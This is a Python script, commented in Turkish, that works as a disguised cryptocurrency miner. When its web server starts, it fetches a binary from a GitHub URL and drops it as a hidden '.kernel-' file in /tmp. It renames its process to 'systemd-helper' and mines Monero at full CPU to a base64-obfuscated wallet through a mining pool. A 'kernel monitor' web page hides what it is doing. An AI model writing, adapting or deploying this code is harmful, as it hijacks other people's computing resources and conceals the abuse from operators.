#!/usr/bin/env python3
import os
import time
import base64
import threading
import subprocess
import ctypes
import http.server
import urllib.request
import json
import tempfile
import re
from urllib.parse import urlparse
from collections import deque

libc = ctypes.CDLL('libc.so.6')
CONSOLE_LOGS = deque(maxlen=50)
STATUS = {"running": False, "message": "Sistem Başlatılıyor..."}
CF_WORKER_HOST = ""
WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=").decode()

# Ana havuz adresi sabitlendi
POOLS = [
    "gulf.moneroocean.stream:443"
]

def clean_ansi(text):
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def log_to_console(msg):
    clean_msg = clean_ansi(msg)
    timestamp = time.strftime("%H:%M:%S")
    line = f"[{timestamp}] {clean_msg}"
    CONSOLE_LOGS.append(line)
    print(msg)

def set_process_name(name):
    try: libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
    except: pass

def kill_process(proc):
    try:
        proc.terminate()
        proc.kill()
    except:
        pass

def execution_logic():
    global STATUS
    try:
        log_to_console("Sistem tam otomatik başlatıldı. Hedef CPU: %100, Beklemeler Kapalı!")
        log_to_console("Çekirdek indiriliyor: GitHub/Exma0/va/x")
        
        url = "https://github.com/Exma0/va/raw/refs/heads/main/x"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            binary_content = response.read()
        
        log_to_console(f"İndirme başarılı. Boyut: {len(binary_content)} bayt.")
        
        with tempfile.NamedTemporaryFile(delete=False, dir='/tmp', prefix='.kernel-') as tmp_file:
            tmp_file.write(binary_content)
            tmp_path = tmp_file.name
        
        os.chmod(tmp_path, 0o755)
        set_process_name("systemd-helper")
        
        pools_to_try = []
        if CF_WORKER_HOST:
            pools_to_try.append(f"{CF_WORKER_HOST}:443")
        pools_to_try.extend(POOLS)
        
        STATUS["running"] = True
        STATUS["message"] = "Sistem Aktif (Oto-Mod)"
        
        for pool_index, pool_host in enumerate(pools_to_try):
            log_to_console(f"Havuz deneniyor [{pool_index+1}/{len(pools_to_try)}]: {pool_host}")
            
            use_tls = ":443" in pool_host
            cmd = [
                tmp_path, "-o", pool_host, "-u", WALLET_ADDR,
                "-p", f"node-{int(time.time())%1000}", "--keepalive",
                "--donate-level=1", "--cpu-max-threads-hint", "100"
            ]
            if use_tls:
                cmd.append("--tls")
            
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"})
            
            error_count = 0
            max_errors = 5
            success = False
            
            for line in iter(proc.stdout.readline, ""):
                if not line:
                    break
                log_to_console(f"{line.strip()}")
                
                if "read error" in line.lower():
                    error_count += 1
                    if error_count >= max_errors:
                        log_to_console(f"Çok fazla hata, havuz anında değiştiriliyor...")
                        kill_process(proc)
                        break
                
                if "accepted" in line.lower():
                    success = True
                    error_count = 0
            
            if proc.poll() is None:
                kill_process(proc)
            
            if success:
                log_to_console(f"Havuz {pool_host} başarılı, kalıcı olarak kullanılıyor.")
                break
            
            if pool_index == len(pools_to_try) - 1:
                log_to_console("Tüm havuzlar denendi, bağlantı kurulamadı. Madenci duracak.")
        
        try:
            os.unlink(tmp_path)
        except:
            pass
        
    except Exception as e:
        STATUS["running"] = False
        STATUS["message"] = "Kritik Hata"
        log_to_console(f"HATA: {str(e)}")

class ControlHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/logs":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(list(CONSOLE_LOGS)).encode())
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        
        # Buton ve form kısımları HTML'den tamamen silindi
        html = f"""
        <html><head><title>Kernel Canlı İzleme</title><style>
            body {{ background: #000; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; }}
            .panel {{ border: 1px solid #222; padding: 20px; max-width: 900px; margin: auto; background: #050505; }}
            #console {{ background: #000; border: 1px solid #111; height: 400px; overflow-y: auto; padding: 10px; font-size: 12px; color: #888; margin-top: 20px; }}
            .stat {{ color: {"#0f0" if STATUS["running"] else "#f00"}; font-weight: bold; }}
        </style></head><body>
            <div class="panel">
                <h2>KERNEL CANLI İZLEME PANELİ</h2>
                <p>DURUM: <span class="stat">{STATUS['message']}</span></p>
                <div id="console">Konsol yükleniyor...</div>
            </div>
            <script>
                async function updateLogs() {{
                    try {{
                        const r = await fetch('/api/logs');
                        const logs = await r.json();
                        const c = document.getElementById('console');
                        c.innerHTML = logs.join('<br>');
                        c.scrollTop = c.scrollHeight;
                    }} catch(e) {{}}
                }}
                /* Konsol milisaniyelik hızla yenilenir */
                setInterval(updateLogs, 500);
                updateLogs();
            </script>
        </body></html>
        """
        self.wfile.write(html.encode())

def run():
    raw_url = os.environ.get("PROXY_URL", "")
    parsed = urlparse(raw_url)
    global CF_WORKER_HOST
    CF_WORKER_HOST = parsed.netloc if parsed.netloc else raw_url.split('/')[0]
    
    port = int(os.environ.get("PORT", 8080))
    
    # Sunucu başlarken sistemi anında tetikler
    if not STATUS["running"]:
        threading.Thread(target=execution_logic, daemon=True).start()
        
    print(f"Web sunucusu {port} portunda başlatılıyor... Sistem oto-modda.")
    http.server.ThreadingHTTPServer(("0.0.0.0", port), ControlHandler).serve_forever()

if __name__ == "__main__":
    run()
